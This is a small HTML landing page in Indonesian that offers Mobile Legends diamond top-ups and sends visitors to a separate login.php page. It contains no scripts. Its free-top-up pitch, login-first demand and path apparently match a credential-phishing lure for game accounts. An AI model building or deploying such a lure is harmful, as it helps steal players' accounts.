<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Top Up Mobile Legends</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-image: url('bg.jpg.webp');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: white;
            text-align: center;
        }

        /* Semitransparent layer on the background to maintain image clarity */
        body::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.3); /* Adding a dark layer to improve readability */
            z-index: -1; /* Makes sure the layer is behind the content */
        }

        .container {
            max-width: 400px;
            padding: 30px;
            background: rgba(255, 255, 255, 0.9); /* White background with some transparency */
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
            font-weight: bold;
        }

        .container h1 {
            margin-bottom: 10px;
            font-size: 26px;
            color: #333; /* Dark color for the title */
        }

        .description {
            margin-bottom: 20px;
            font-size: 16px;
            line-height: 1.5;
            color: #333; /* Dark color for the description text */
        }

        a.button {
            display: inline-block;
            text-decoration: none;
            background-color: #E63946;
            color: white;
            padding: 10px 20px;
            font-size: 16px;
            border-radius: 5px;
            transition: background-color 0.3s ease, transform 0.2s ease;
        }

        a.button:hover {
            background-color: #b71c1c;
            transform: scale(1.05);
        }

        a.button:active {
            background-color: #7f0000;
            transform: scale(1);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Top Up Mobile Legends</h1>
        <p class="description">
            Nikmati kemudahan isi diamond untuk Mobile Legends. <br>
            Pastikan Anda sudah login untuk melakukan pembelian!
        </p>
        <a href="/ml/share/login.php" class="button">Login untuk Melanjutkan</a>
    </div>
</body>
</html>
